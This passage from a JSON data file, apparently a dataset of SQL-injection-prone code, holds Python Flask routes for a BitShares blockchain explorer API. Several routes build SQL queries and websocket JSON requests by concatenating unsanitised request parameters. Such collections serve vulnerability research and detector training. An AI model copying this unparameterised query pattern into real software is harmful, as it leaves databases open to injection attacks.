ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+asset_api+',\"get_asset_holders\",[\"'+asset_id+'\", 0, 20]]}')\n    result =  ws.recv()\n\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_workers')\ndef get_workers():\n    ws.send('{\"jsonrpc\": \"2.0\", \"method\": \"get_worker_count\", \"params\": [], \"id\": 1}')\n\n    count =  ws.recv()\n    count_j = json.loads(count)\n\n    workers_count = int(count_j[\"result\"])\n\n    #print workers_count\n\n    # get the votes of woirker 114.0 - refund 400k\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.14.0\"]]]}')\n    result_0 = ws.recv()\n    j_0 = json.loads(result_0)\n    #account_id = j[\"result\"][0][\"worker_account\"]\n    thereshold =  int(j_0[\"result\"][0][\"total_votes_for\"])\n\n    workers = []\n    for w in range(0, workers_count):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.14.'+str(w)+'\"]]]}')\n        result =  ws.recv()\n\n        j = json.loads(result)\n        account_id = j[\"result\"][0][\"worker_account\"]\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n        result2 = ws.recv()\n        j2 = json.loads(result2)\n\n        account_name = j2[\"result\"][0][\"name\"]\n        j[\"result\"][0][\"worker_account_name\"] = account_name\n\n        current_votes = int(j[\"result\"][0][\"total_votes_for\"])\n        perc = (current_votes*100)/thereshold\n        j[\"result\"][0][\"perc\"] = perc\n\n        workers.append(j[\"result\"])\n\n    r_workers = workers[::-1]\n    return jsonify(filter(None, r_workers))\n\n\ndef isObject(string):\n    parts = string.split(\".\")\n    if len(parts) == 3:\n        return True\n    else:\n        return False\n\n\n@app.route('/get_markets')\ndef get_markets():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM markets WHERE aid='\"+asset_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/get_most_active_markets')\ndef get_most_active_markets():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM markets WHERE volume>0 ORDER BY volume DESC LIMIT 100\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/get_order_book')\ndef get_order_book():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_order_book\",[\"'+base+'\", \"'+quote+'\", 50]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_margin_positions')\ndef get_open_orders():\n    account_id = request.args.get('account_id')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_margin_positions\",[\"'+account_id+'\"]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_witnesses')\ndef get_witnesses():\n    ws.send('{\"jsonrpc\": \"2.0\", \"method\": \"get_witness_count\", \"params\": [], \"id\": 1}')\n    count =  ws.recv()\n    count_j = json.loads(count)\n    witnesses_count = int(count_j[\"result\"])\n\n    witnesses = []\n    for w in range(0, witnesses_count):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.6.'+str(w)+'\"]]]}')\n        result =  ws.recv()\n\n        j = json.loads(result)\n        if j[\"result\"][0]:\n            account_id = j[\"result\"][0][\"witness_account\"]\n            #print account_id\n            ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n            result2 = ws.recv()\n            j2 = json.loads(result2)\n\n            account_name = j2[\"result\"][0][\"name\"]\n            j[\"result\"][0][\"witness_account_name\"] = account_name\n        else:\n            #j[\"result\"][0][\"witness_account_name\"] = \"\"\n            continue\n\n        witnesses.append(j[\"result\"])\n\n\n    witnesses = sorted(witnesses, key=lambda k: int(k[0]['total_votes']))\n    r_witnesses = witnesses[::-1]\n\n    return jsonify(filter(None, r_witnesses))\n\n\n@app.route('/get_committee_members')\ndef get_committee_members():\n    ws.send('{\"jsonrpc\": \"2.0\", \"method\": \"get_committee_count\", \"params\": [], \"id\": 1}')\n    count =  ws.recv()\n    count_j = json.loads(count)\n    committee_count = int(count_j[\"result\"])\n\n    committee_members = []\n    for w in range(0, committee_count):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.5.'+str(w)+'\"]]]}')\n        result =  ws.recv()\n\n        j = json.loads(result)\n        if j[\"result\"][0]:\n            account_id = j[\"result\"][0][\"committee_member_account\"]\n            #print account_id\n            ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n            result2 = ws.recv()\n            j2 = json.loads(result2)\n\n            account_name = j2[\"result\"][0][\"name\"]\n            j[\"result\"][0][\"committee_member_account_name\"] = account_name\n        else:\n            #j[\"result\"][0][\"witness_account_name\"] = \"\"\n            continue\n\n        committee_members.append(j[\"result\"])\n\n    committee_members = sorted(committee_members, key=lambda k: int(k[0]['total_votes']))\n    r_committee = committee_members[::-1] # this reverses array\n\n    return jsonify(filter(None, r_committee))\n\n\n@app.route('/market_chart_dates')\ndef market_chart_dates():\n    base = datetime.date.today()\n    date_list = [base - datetime.timedelta(days=x) for x in range(0, 100)]\n    date_list = [d.strftime(\"%Y-%m-%d\") for d in date_list]\n    #print len(list(reversed(date_list)))\n    return jsonify(list(reversed(date_list)))\n\n\n@app.route('/market_chart_data')\ndef market_chart_data():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + base + '\"], 0]]}')\n    result_l = ws.recv()\n    j_l = json.loads(result_l)\n    base_id = j_l[\"result\"][0][\"id\"]\n    base_precision = 10**j_l[\"result\"][0][\"precision\"]\n    #print base_id\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + quote + '\"], 0]]}')\n    result_l = ws.recv()\n    j_l = json.loads(result_l)\n    #print j_l\n    quote_id = j_l[\"result\"][0][\"id\"]\n    quote_precision = 10**j_l[\"result\"][0][\"precision\"]\n    #print quote_id\n\n    now = datetime.date.today()\n    ago = now - datetime.timedelta(days=100)\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+history_api+',\"get_market_history\", [\"'+base_id+'\", \"'+quote_id+'\", 86400, \"'+ago.strftime(\"%Y-%m-%dT%H:%M:%S\")+'\", \"'+now.strftime(\"%Y-%m-%dT%H:%M:%S\")+'\"]]}')\n    result_l = ws.recv()\n    j_l = json.loads(result_l)\n\n    data = []\n    for w in range(0, len(j_l[\"result\"])):\n\n        open_quote = float(j_l[\"result\"][w][\"open_quote\"])\n        high_quote = float(j_l[\"result\"][w][\"high_quote\"])\n        low_quote = float(j_l[\"result\"][w][\"low_quote\"])\n        close_quote = float(j_l[\"result\"][w][\"close_quote\"])\n\n        open_base = float(j_l[\"result\"][w][\"open_base\"])\n        high_base = float(j_l[\"result\"][w][\"high_base\"])\n        low_base = float(j_l[\"result\"][w][\"low_base\"])\n        close_base = float(j_l[\"result\"][w][\"close_base\"])\n\n        open = 1/(float(open_base/base_precision)/float(open_quote/quote_precision))\n        high = 1/(float(high_base/base_precision)/float(high_quote/quote_precision))\n        low = 1/(float(low_base/base_precision)/float(low_quote/quote_precision))\n        close = 1/(float(close_base/base_precision)/float(close_quote/quote_precision))\n\n        ohlc = [open, close, low, high]\n\n        data.append(ohlc)\n\n    append = [0,0,0,0]\n    if len(data) < 99:\n        complete = 99 - len(data)\n        for c in range(0, complete):\n            data.insert(0, append)\n\n    return jsonify(data)\n\n\ndef findMax(a,b):\n    if a != 'Inf' and b != 'Inf':\n        return max([a, b])\n    elif a == 'Inf':\n        return b\n    else:\n        return a\n\n\ndef findMin(a, b):\n    if a != 0 and b != 0:\n        return min([a, b])\n    elif a == 0:\n        return b\n    else:\n        return a\n\n\n@app.route('/top_proxies')\ndef top_proxies():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT sum(amount) FROM holders\"\n    cur.execute(query)\n    total = cur.fetchone()\n    total_votes = total[0]\n\n    query = \"SELECT voting_as FROM holders WHERE voting_as<>'1.2.5' group by voting_as\"\n    cur.execute(query)\n    results = cur.fetchall()\n    #con.close()\n\n    proxies = []\n\n    for p in range(0, len(results)):\n\n        proxy_line = [0] * 5\n\n        proxy_id = results[p][0]\n        proxy_line[0] = proxy_id\n\n        query = \"SELECT account_name, amount FROM holders WHERE account_id='\"+proxy_id+\"' LIMIT 1\"\n        cur.execute(query)\n        proxy = cur.fetchone()\n\n        try:\n            proxy_name = proxy[0]\n            proxy_amount = proxy[1]\n        except:\n            proxy_name = \"unknown\"\n            proxy_amount = 0\n\n\n        proxy_line[1] = proxy_name\n\n        query = \"SELECT amount, account_id FROM holders WHERE voting_as='\"+proxy_id+\"'\"\n        cur.execute(query)\n        results2 = cur.fetchall()\n\n        proxy_line[2] = int(proxy_amount)\n\n        for p2 in range(0, len(results2)):\n            amount = results2[p2][0]\n            account_id = results2[p2][1]\n            proxy_line[2] = proxy_line[2] + int(amount)  # total proxy votes\n            proxy_line[3] = proxy_line[3] + 1       # followers\n\n        if proxy_line[3] > 2:\n            percentage = float(float(proxy_line[2]) * 100.0/ float(total_votes))\n            proxy_line[4] = percentage\n            proxies.append(proxy_line)\n\n    con.close()\n\n    proxies = sorted(proxies, key=lambda k: int(k[2]))\n    r_proxies = proxies[::-1]\n\n    return jsonify(filter(None, r_proxies))\n\n\n@app.route('/top_holders')\ndef top_holders():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM holders WHERE voting_as='1.2.5' ORDER BY amount DESC LIMIT 10\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/witnesses_votes')\ndef witnesses_votes():\n    proxies = top_proxies()\n    proxies = proxies.response\n    proxies = ''.join(proxies)\n    proxies = json.loads(proxies)\n    proxies = proxies[:10]\n\n    witnesses = get_witnesses()\n    witnesses = witnesses.response\n    witnesses = ''.join(witnesses)\n    witnesses = json.loads(witnesses)\n    witnesses = witnesses[:25]\n\n    w, h = len(proxies) + 2, len(witnesses)\n    witnesses_votes = [[0 for x in range(w)] for y in range(h)]\n\n    for w in range(0, len(witnesses)):\n        vote_id =  witnesses[w][0][\"vote_id\"]\n        id_witness = witnesses[w][0][\"id\"]\n        witness_account_name = witnesses[w][0][\"witness_account_name\"]\n\n        witnesses_votes[w][0] = witness_account_name\n        witnesses_votes[w][1] = id_witness\n\n        c = 2\n\n        for p in range(0, len(proxies)):\n            id_proxy = proxies[p][0]\n\n            #witnesses_votes[w][c] = id_proxy\n\n            ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+id_proxy+'\"]]]}')\n            result = ws.recv()\n            j = json.loads(result)\n\n            votes = j[\"result\"][0][\"options\"][\"votes\"]\n            #print votes\n            p_vote = \"-\"\n            for v in range(0, len(votes)):\n\n                if votes[v] == vote_id:\n                    p_vote = \"Y\"\n\n            witnesses_votes[w][c] = id_proxy + \":\" + p_vote\n\n            c = c + 1\n\n    #print witnesses_votes\n    return jsonify(witnesses_votes)\n\n\n@app.route('/workers_votes')\ndef workers_votes():\n    proxies = top_proxies()\n    proxies = proxies.response\n    proxies = ''.join(proxies)\n    proxies = json.loads(proxies)\n    proxies = proxies[:10]\n\n    workers = get_workers()\n    workers = workers.response\n    workers = ''.join(workers)\n    workers = json.loads(workers)\n    workers = workers[:10]\n    #print workers\n\n    w, h = len(proxies) + 2, len(workers)\n    workers_votes = [[0 for x in range(w)] for y in range(h)]\n\n    for w in range(0, len(workers)):\n        vote_id =  workers[w][0][\"vote_for\"]\n        id_worker = workers[w][0][\"id\"]\n        worker_account_name = workers[w][0][\"worker_account_name\"]\n\n        workers_votes[w][0] = worker_account_name\n        workers_votes[w][1] = id_worker\n\n        c = 2\n\n        for p in range(0, len(proxies)):\n            id_proxy = proxies[p][0]\n\n            #witnesses_votes[w][c] = id_proxy\n\n            ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+id_proxy+'\"]]]}')\n            result = ws.recv()\n            j = json.loads(result)\n\n            votes = j[\"result\"][0][\"options\"][\"votes\"]\n            #print votes\n            p_vote = \"-\"\n            for v in range(0, len(votes)):\n\n                if votes[v] == vote_id:\n                    p_vote = \"Y\"\n\n            workers_votes[w][c] = id_proxy + \":\" + p_vote\n\n            c = c + 1\n\n    #print witnesses_votes\n    return jsonify(workers_votes)\n\n\n@app.route('/committee_votes')\ndef committee_votes():\n    proxies = top_proxies()\n    proxies = proxies.response\n    proxies = ''.join(proxies)\n    proxies = json.loads(proxies)\n    proxies = proxies[:10]\n\n    committee = get_committee_members()\n    committee = committee.response\n    committee = ''.join(committee)\n    committee = json.loads(committee)\n    committee = committee[:11]\n    #print workers\n\n    w, h = len(proxies) + 2, len(committee)\n    committee_votes = [[0 for x in range(w)] for y in range(h)]\n\n    for w in range(0, len(committee)):\n        vote_id =  committee[w][0][\"vote_id\"]\n        id_committee = committee[w][0][\"id\"]\n        committee_account_name = committee[w][0][\"committee_member_account_name\"]\n\n        committee_votes[w][0] = committee_account_name\n        committee_votes[w][1] = id_committee\n\n        c = 2\n\n        for p in range(0, len(proxies)):\n            id_proxy = proxies[p][0]\n\n            #witnesses_votes[w][c] = id_proxy\n\n            ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+id_proxy+'\"]]]}')\n            result = ws.recv()\n            j = json.loads(result)\n\n            votes = j[\"result\"][0][\"options\"][\"votes\"]\n            #print votes\n            p_vote = \"-\"\n            for v in range(0, len(votes)):\n\n                if votes[v] == vote_id:\n                    p_vote = \"Y\"\n                    committee_votes[w][c] = id_proxy + \":\" + p_vote\n                    break\n                else:\n                    p_vote = \"-\"\n                    committee_votes[w][c] = id_proxy + \":\" + p_vote\n\n            c = c + 1\n\n    #print witnesses_votes\n    return jsonify(committee_votes)\n\n\n@app.route('/top_markets')\ndef top_markets():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume FROM markets ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n    total = 0\n    for v in range(0, len(results)):\n        total = total + results[v][0]\n\n    query = \"SELECT pair, volume FROM markets ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    w = 2\n    h = len(results)\n    top_markets = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_markets[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_markets[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_markets)\n\n\n@app.route('/top_smartcoins')\ndef top_smartcoins():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume FROM assets WHERE type='SmartCoin' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n    total = 0\n    for v in range(0, len(results)):\n        total = total + results[v][0]\n\n    query = \"SELECT aname, volume FROM assets WHERE type='SmartCoin' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    w = 2\n    h = len(results)\n    top_smartcoins = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_smartcoins[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_smartcoins[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_smartcoins)\n\n\n@app.route('/top_uias')\ndef top_uias():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume FROM assets WHERE type='User Issued' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n    total = 0\n    for v in range(0, len(results)):\n        total = total + results[v][0]\n\n    query = \"SELECT aname, volume FROM assets WHERE TYPE='User Issued' ORDER BY volume DESC LIMIT 7\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    w = 2\n    h = len(results)\n    top_uias = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_uias[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_uias[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_uias)\n\n\n@app.route('/top_operations')\ndef top_operations():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT count(*) FROM ops\"\n    cur.execute(query)\n    results = cur.fetchone()\n    total = results[0]\n\n    query = \"SELECT op_type, count(op_type) AS counter FROM ops GROUP BY op_type ORDER BY counter DESC\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n\n    w = 2\n    h = len(results)\n    top_operations = [[0 for x in range(w)] for y in range(h)]\n\n    for tp in range(0, h):\n        #print results[tp][1]\n        top_operations[tp][0] = results[tp][0]\n        #perc = (results[tp][1]*100)/total\n        top_operations[tp][1] = results[tp][1]\n\n    con.close()\n    return jsonify(top_operations)\n\n\n@app.route('/last_network_transactions')\ndef last_network_transactions():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM ops ORDER BY block_num DESC LIMIT 20\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    #print results\n    return jsonify(results)\n\n\n@app.route('/lookup_accounts')\ndef lookup_accounts():\n    start = request.args.get('start')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_accounts\",[\"'+start+'\", 1000]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/lookup_assets')\ndef lookup_assets():\n    start = request.args.get('start')\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT aname FROM assets WHERE aname LIKE '\"+start+\"%'\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/getlastblocknumbher')\ndef getlastblocknumber():\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"][\"head_block_number\"])\n\n\n@app.route('/account_history_pager')\ndef account_history_pager():\n    page = request.args.get('page')\n    account_id = request.args.get('account_id')\n\n    # connecting into a full node.\n    #full_websocket_url = \"ws://node.testnet.bitshares.eu:18092/ws\"\n    full_ws = create_connection(config.FULL_WEBSOCKET_URL)\n\n    full_ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  full_ws.recv()\n\n    full_ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  full_ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n\n    if not isObject(account_id):\n        full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = full_ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    # need to get total ops for account\n    full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"' + account_id + '\"]]]}')\n    result_a = full_ws.recv()\n    j_a = json.loads(result_a)\n\n    stats = j_a[\"result\"][0][\"statistics\"]\n\n    full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+stats+'\"]]]}')\n    result_s =  full_ws.recv()\n    j_s = json.loads(result_s)\n\n    total_ops = j_s[\"result\"][0][\"total_ops\"]\n    #print total_ops\n    start = total_ops - (20 * int(page))\n    stop = total_ops - (40 * int(page))\n\n    if stop < 0:\n        stop = 0\n\n    if start > 0:\n        full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+history_api+',\"get_relative_account_history\",[\"'+account_id+'\", '+str(stop)+', 20, '+str(start)+']]}')\n        result_f =  full_ws.recv()\n        j_f = json.loads(result_f)\n\n        for c in range(0, len(j_f[\"result\"])):\n            full_ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block_header\",[' + str(j_f[\"result\"][c][\"block_num\"]) + ', 0]]}')\n            result2 = full_ws.recv()\n            j2 = json.loads(result2)\n            j_f[\"result\"][c][\"timestamp\"] = j2[\"result\"][\"timestamp\"]\n            j_f[\"result\"][c][\"witness\"] = j2[\"result\"][\"witness\"]\n\n        return jsonify(j_f[\"result\"])\n    else:\n        return \"\"\n\n\n@app.route('/get_limit_orders')\ndef get_limit_orders():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_limit_orders\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_call_orders')\ndef get_call_orders():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_call_orders\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_settle_orders')\ndef get_settle_orders():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_settle_orders\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_fill_order_history')\ndef get_fill_order_history():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[' + history_api + ',\"get_fill_order_history\",[\"' + base + '\", \"' + quote + '\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_dex_total_volume')\ndef get_dex_total_volume():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select price from assets where aname='USD'\"\n    cur.execute(query)\n    results = cur.fetchone()\n    usd_price = results[0]\n\n    query = \"select price from assets where aname='CNY'\"\n    cur.execute(query)\n    results = cur.fetchone()\n    cny_price = results[0]\n\n    query = \"select sum(volume) from assets WHERE aname!='BTS'\"\n    cur.execute(query)\n    results = cur.fetchone()\n    volume = results[0]\n\n    query = \"select sum(mcap) from assets\"\n    cur.execute(query)\n    results = cur.fetchone()\n    market_cap = results[0]\n    con.close()\n\n    res = {\"volume_bts\": round(volume), \"volume_usd\": round(volume/usd_price), \"volume_cny\": round(volume/cny_price),\n           \"market_cap_bts\": round(market_cap), \"market_cap_usd\": round(market_cap/usd_price), \"market_cap_cny\": round(market_cap/cny_price)}\n\n    return jsonify(res)\n\n\n@app.route('/daily_volume_dex_dates')\ndef daily_volume_dex_dates():\n    base = datetime.date.today()\n    date_list = [base - datetime.timedelta(days=x) for x in range(0, 60)]\n    date_list = [d.strftime(\"%Y-%m-%d\") for d in date_list]\n    #print len(list(reversed(date_list)))\n    return jsonify(list(reversed(date_list)))\n\n\n@app.route('/daily_volume_dex_data')\ndef daily_volume_dex_data():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select value from stats where type='volume_bts' order by date desc limit 60\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    mod = [0 for x in range(len(results))]\n    for r in range(0, len(results)):\n        mod[r] = results[r][0]\n\n    return jsonify(list(reversed(mod)))\n\n\n@app.route('/get_all_asset_holders')\ndef get_all_asset_holders():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    all = []\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[' + asset_api + ',\"get_asset_holders\",[\"' + asset_id + '\", 0, 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    for r in range(0, len(j[\"result\"])):\n        all.append(j[\"result\"][r])\n\n    len_result = len(j[\"result\"])\n    start = 100\n    while  len_result == 100:\n        start = start + 100\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[' + asset_api + ',\"get_asset_holders\",[\"' + asset_id + '\", ' + str(start) + ', 100]]}')\n        result = ws.recv()\n        j = json.loads(result)\n        len_result = len(j[\"result\"])\n        for r in range(0, len(j[\"result\"])):\n            all.append(j[\"result\"][r])\n\n\n    return jsonify(all)\n\n\n@app.route('/referrer_count')\ndef referrer_count():\n    account_id = request.args.get('account_id')\n\n    if not isObject(account_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select count(*) from referrers where referrer='\"+account_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchone()\n\n    return jsonify(results)\n\n\n@app.route('/get_all_referrers')\ndef get_all_referrers():\n    account_id = request.args.get('account_id')\n\n    if not isObject(account_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"select * from referrers where referrer='\"+account_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchall()\n\n    return jsonify(results)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/myneworder/braundex-python-api-backend/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_assets.py",
        "source": "#!/usr/bin/env python2\nimport json\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport api\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\nquery = \"TRUNCATE assets\"\ncur.execute(query)\n\nquery = \"ALTER SEQUENCE assets_id_seq RESTART WITH 1;\"\ncur.execute(query)\n\n# alter sequence of the ops once a day here\nquery = \"DELETE FROM ops WHERE oid NOT IN (SELECT oid FROM ops ORDER BY oid DESC LIMIT 10);\"\ncur.execute(query)\n\nfor x in range(0, 10):\n    query = \"UPDATE ops set oid=\"+str(x+1)+\" WHERE oid IN (SELECT oid FROM ops ORDER BY oid LIMIT 1 OFFSET \"+str(x)+\");\"\n    #print query\n    cur.execute(query)\n\nquery = \"ALTER SEQUENCE ops_oid_seq RESTART WITH 11;\"\ncur.execute(query)\n\ncon.commit()\n\nall_assets = []\n\nws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"AAAAA\", 100]]}')\nresult = ws.recv()\nj = json.loads(result)\n\nall_assets.append(j);\n\nlen_result = len(j[\"result\"])\n\nprint len_result\n#print all_assets\n\nwhile len_result == 100:\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"'+j[\"result\"][99][\"symbol\"]+'\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    len_result = len(j[\"result\"])\n    all_assets.append(j);\n\nfor x in range(0, len(all_assets)):\n    size = len(all_assets[x][\"result\"])\n    print size\n\n    for i in range(0, size):\n        symbol = all_assets[x][\"result\"][i][\"symbol\"]\n        asset_id = 